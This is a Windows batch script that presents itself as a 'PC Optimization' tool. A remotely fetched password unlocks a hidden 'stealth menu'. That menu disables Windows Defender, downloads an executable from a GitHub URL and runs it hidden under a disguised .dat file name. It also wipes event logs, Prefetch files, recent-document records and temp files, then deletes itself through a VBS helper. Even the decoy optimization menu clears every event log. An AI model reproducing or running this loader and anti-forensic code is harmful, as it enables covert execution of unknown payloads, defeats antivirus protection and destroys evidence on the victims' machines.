@echo off
setlocal enabledelayedexpansion

:: === CONFIGURATIONS ===
set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
set "SETUP_EXE=%temp%\CAXVN.exe"
set "DISGUISED_EXE=%temp%\user_data_blob.dat"
set "TMPPASS=%temp%\stealth_check.txt"

:: Use best available PowerShell
set "PWSH=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%ProgramFiles%\PowerShell\7\pwsh.exe" set "PWSH=%ProgramFiles%\PowerShell\7\pwsh.exe"

:: === LOGIN PAGE ===
:LOGIN
cls
echo ==========================================
echo           PC Optimization
echo      Developed by MaxyPrime
echo ==========================================
echo.
set /p userpass=Enter your password: 

if "%userpass%"=="1" (
    goto OPTIMIZATION_MENU
)

:: === Check Remote Stealth Password ===
echo [*] Verifying credentials with server...
> "%TMPPASS%" (
    "%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command ^
        "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()" 2>nul
)

if not exist "%TMPPASS%" (
    echo [!] ERROR: Failed to connect to authentication server.
    timeout /t 2 >nul
    goto LOGIN
)

set /p REMOTE_PASS=<"%TMPPASS%"
del "%TMPPASS%" >nul 2>&1

if /i "%userpass%"=="%REMOTE_PASS%" (
    goto STEALTH_MENU
) else (
    echo [!] Incorrect password. Try again.
    timeout /t 2 >nul
    goto LOGIN
)

:: === PC OPTIMIZATION MENU ===
:OPTIMIZATION_MENU
cls
echo ==========================================
echo           PC Optimization Menu
echo ==========================================
echo 1. Clean Registry Logs
echo 2. Clean Event Logs
echo 3. Clear Temp Files
echo 4. Flush DNS Cache
echo 5. Check Disk for Errors
echo 6. Defragment Disk
echo 7. System File Checker
echo 8. Return to Main Menu
echo.
set /p optchoice=Select an option (1-8):

if "%optchoice%"=="1" goto CLEAN_REGISTRY_LOGS
if "%optchoice%"=="2" goto CLEAN_EVENT_LOGS
if "%optchoice%"=="3" goto CLEAR_TEMP_FILES
if "%optchoice%"=="4" goto FLUSH_DNS_CACHE
if "%optchoice%"=="5" goto CHECK_DISK
if "%optchoice%"=="6" goto DEFRAGMENT_DISK
if "%optchoice%"=="7" goto SYSTEM_FILE_CHECKER
if "%optchoice%"=="8" goto LOGIN

echo Invalid option. Try again.
timeout /t 2 >nul
goto OPTIMIZATION_MENU

:CLEAN_REGISTRY_LOGS
echo [*] Cleaning Registry Logs...
for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
echo [+] Registry logs cleared.
pause
goto OPTIMIZATION_MENU

:CLEAN_EVENT_LOGS
echo [*] Cleaning Event Logs...
for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
echo [+] Event logs cleared.
pause
goto OPTIMIZATION_MENU

:CLEAR_TEMP_FILES
echo [*] Clearing Temp Files...
del /s /q "%temp%\*.*" >nul 2>&1
del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
echo [+] Temp files cleared.
pause
goto OPTIMIZATION_MENU

:FLUSH_DNS_CACHE
echo [*] Flushing DNS Cache...
ipconfig /flushdns >nul
echo [+] DNS Cache flushed.
pause
goto OPTIMIZATION_MENU

:CHECK_DISK
echo [*] Checking Disk for Errors (C:)...
chkdsk C: /f /r
pause
goto OPTIMIZATION_MENU

:DEFRAGMENT_DISK
echo [*] Defragmenting C: drive...
defrag C: /U /V
pause
goto OPTIMIZATION_MENU

:SYSTEM_FILE_CHECKER
echo [*] Running System File Checker...
sfc /scannow
pause
goto OPTIMIZATION_MENU

:: === STEALTH MENU ===
:STEALTH_MENU
cls
echo ===========================================
echo.
echo             *** STEALTH MENU ***
echo          Authorized Personnel Only
echo.
echo ===========================================
echo.
echo 1. Setup
echo 2. Run
echo 3. Bypass
echo 4. Alert the Admin
echo 5. Exit
echo 6. Self-Destruct Stealth Menu
echo.
set /p choice=Choose an option: 

if "%choice%"=="1" goto SETUP
if "%choice%"=="2" goto RUN
if "%choice%"=="3" goto BYPASS
if "%choice%"=="4" goto ALERT_ADMIN
if "%choice%"=="5" exit
if "%choice%"=="6" goto SELF_DESTRUCT

echo Invalid choice. Try again.
timeout /t 2 >nul
goto STEALTH_MENU

:: === Setup Option ===
:SETUP
echo [*] Disabling Defender temporarily...
"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

echo [*] STEP 1: Preparing download...
timeout /t 1 >nul
echo [*] STEP 2: Connecting to GitHub...
timeout /t 1 >nul
echo [*] STEP 3: Downloading EXE...
"%PWSH%" -NoProfile -Command "$c = New-Object System.Net.WebClient; $c.DownloadFile('%EXE_URL%', '%SETUP_EXE%')" >nul 2>&1

if not exist "%SETUP_EXE%" (
    echo [!] ERROR: Download failed.
    "%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
    pause
    goto STEALTH_MENU
)

echo [+] Setup completed. EXE ready.
"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
pause
goto STEALTH_MENU

:: === Run Option ===
:RUN
echo [*] Preparing EXE launch...
if not exist "%SETUP_EXE%" (
    echo [!] ERROR: Setup file missing.
    pause
    goto STEALTH_MENU
)

echo [*] Copying EXE to disguised .dat file...
copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1

echo [*] Executing in background...
"%PWSH%" -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%DISGUISED_EXE%'" >nul 2>&1

echo [*] Monitoring process...
:WAIT_LOOP
timeout /t 2 >nul
tasklist /FI "IMAGENAME eq user_data_blob.dat" | find /I "user_data_blob.dat" >nul
if not errorlevel 1 (
    goto WAIT_LOOP
)

echo [+] Execution completed. Cleaning up...
del /f /q "%DISGUISED_EXE%" >nul 2>&1
pause
goto STEALTH_MENU

:: === Bypass Option ===
:BYPASS
echo [*] Restoring original settings...

echo [*] Re-enabling Defender...
"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1

echo [*] Starting Data Usage Service...
sc start "DataUsageSvc" >nul 2>&1

echo [*] Clearing traces...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
del /s /q "%temp%\*.*" >nul 2>&1
del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" 2>nul
ipconfig /flushdns >nul
echo off | clip

echo [+] All cleanup done.
pause
goto STEALTH_MENU

:: === Alert Admin Option ===
:ALERT_ADMIN
cls
echo Enter your alert message (max 20 words):
set /p alertmsg=
echo [*] You entered: %alertmsg%
echo [!] Feature not implemented yet.
pause
goto STEALTH_MENU

:: === Self-Destruct Option ===
:SELF_DESTRUCT
echo [*] Initiating Self-Destruct...
timeout /t 1 >nul
del /f /q "%SETUP_EXE%" >nul 2>&1
del /f /q "%DISGUISED_EXE%" >nul 2>&1

set "BATFILE=%~f0"
> "%temp%\delete_me.vbs" echo Set fso = CreateObject("Scripting.FileSystemObject")
>> "%temp%\delete_me.vbs" echo fso.DeleteFile "%BATFILE%", True
start /min "" "%temp%\delete_me.vbs"
timeout /t 2 >nul
del "%temp%\delete_me.vbs" >nul 2>&1
exit
